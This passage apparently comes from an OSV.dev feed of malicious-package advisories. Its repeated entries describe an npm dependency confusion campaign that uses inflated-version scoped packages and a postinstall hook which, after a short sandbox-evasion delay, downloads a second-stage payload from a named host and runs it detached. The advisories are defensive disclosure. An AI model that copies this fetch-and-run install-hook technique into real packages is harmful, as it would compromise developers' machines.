-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:49Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @cloudplatform-single-spa/dataplatform-cloudberry (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@cloudplatform-single-spa/dataplatform-cloudberry&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@cloudplatform-single-spa` and `@mlspace` npm scopes. The attacker (npm user **mr.4nd3r50n**) published 139 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file (`._cloudplatform-single-spa_init.js` in the system temp directory), and spawns it as a detached Node.js process that continues running after npm exits. The payload …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4905"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4904: Malicious code in @cloudplatform-single-spa/dataplatform-bi (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4904</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4904"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:49Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @cloudplatform-single-spa/dataplatform-bi (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@cloudplatform-single-spa/dataplatform-bi&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@cloudplatform-single-spa` and `@mlspace` npm scopes. The attacker (npm user **mr.4nd3r50n**) published 139 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file (`._cloudplatform-single-spa_init.js` in the system temp directory), and spawns it as a detached Node.js process that continues running after npm exits. The payload …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4904"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4902: Malicious code in @cloudplatform-single-spa/datagrid (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4902</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4902"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:48Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @cloudplatform-single-spa/datagrid (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@cloudplatform-single-spa/datagrid&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@cloudplatform-single-spa` and `@mlspace` npm scopes. The attacker (npm user **mr.4nd3r50n**) published 139 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file (`._cloudplatform-single-spa_init.js` in the system temp directory), and spawns it as a detached Node.js process that continues running after npm exits. The payload …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4902"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4901: Malicious code in @cloudplatform-single-spa/cp-api-gw (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4901</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4901"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:48Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @cloudplatform-single-spa/cp-api-gw (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@cloudplatform-single-spa/cp-api-gw&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@cloudplatform-single-spa` and `@mlspace` npm scopes. The attacker (npm user **mr.4nd3r50n**) published 139 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file (`._cloudplatform-single-spa_init.js` in the system temp directory), and spawns it as a detached Node.js process that continues running after npm exits. The payload …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4901"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4900: Malicious code in @cloudplatform-single-spa/corax (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4900</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4900"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:48Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @cloudplatform-single-spa/corax (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@cloudplatform-single-spa/corax&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@cloudplatform-single-spa` and `@mlspace` npm scopes. The attacker (npm user **mr.4nd3r50n**) published 139 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file (`._cloudplatform-single-spa_init.js` in the system temp directory), and spawns it as a detached Node.js process that continues running after npm exits. The payload …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4900"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4899: Malicious code in @cloudplatform-single-spa/container-registry (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4899</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4899"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:48Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @cloudplatform-single-spa/container-registry (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@cloudplatform-single-spa/container-registry&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@cloudplatform-single-spa` and `@mlspace` npm scopes. The attacker (npm user **mr.4nd3r50n**) published 139 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file (`._cloudplatform-single-spa_init.js` in the system temp directory), and spawns it as a detached Node.js process that continues running after npm exits. The payload …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4899"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4898: Malicious code in @cloudplatform-single-spa/cnapp-ui (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4898</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4898"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:48Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @cloudplatform-single-spa/cnapp-ui (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@cloudplatform-single-spa/cnapp-ui&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@cloudplatform-single-spa` and `@mlspace` npm scopes. The attacker (npm user **mr.4nd3r50n**) published 139 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file (`._cloudplatform-single-spa_init.js` in the system temp directory), and spawns it as a detached Node.js process that continues running after npm exits. The payload …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4898"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4897: Malicious code in @cloudplatform-single-spa/cloudia (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4897</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4897"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:48Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @cloudplatform-single-spa/cloudia (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@cloudplatform-single-spa/cloudia&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@cloudplatform-single-spa` and `@mlspace` npm scopes. The attacker (npm user **mr.4nd3r50n**) published 139 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file (`._cloudplatform-single-spa_init.js` in the system temp directory), and spawns it as a detached Node.js process that continues running after npm exits. The payload …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4897"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4896: Malicious code in @cloudplatform-single-spa/cloud-dns (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4896</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4896"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:48Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @cloudplatform-single-spa/cloud-dns (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@cloudplatform-single-spa/cloud-dns&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@cloudplatform-single-spa` and `@mlspace` npm scopes. The attacker (npm user **mr.4nd3r50n**) published 139 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file (`._cloudplatform-single-spa_init.js` in the system temp directory), and spawns it as a detached Node.js process that continues running after npm exits. The payload …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4896"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4895: Malicious code in @cloudplatform-single-spa/clickhouse (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4895</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4895"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:48Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @cloudplatform-single-spa/clickhouse (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@cloudplatform-single-spa/clickhouse&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@cloudplatform-single-spa` and `@mlspace` npm scopes. The attacker (npm user **mr.4nd3r50n**) published 139 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file (`._cloudplatform-single-spa_init.js` in the system temp directory), and spawns it as a detached Node.js process that continues running after npm exits. The payload …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4895"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4894: Malicious code in @cloudplatform-single-spa/certificate-manager (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4894</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4894"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:47Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @cloudplatform-single-spa/certificate-manager (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@cloudplatform-single-spa/certificate-manager&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@cloudplatform-single-spa` and `@mlspace` npm scopes. The attacker (npm user **mr.4nd3r50n**) published 139 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file (`._cloudplatform-single-spa_init.js` in the system temp directory), and spawns it as a detached Node.js process that continues running after npm exits. The payload …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4894"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
 </feed>
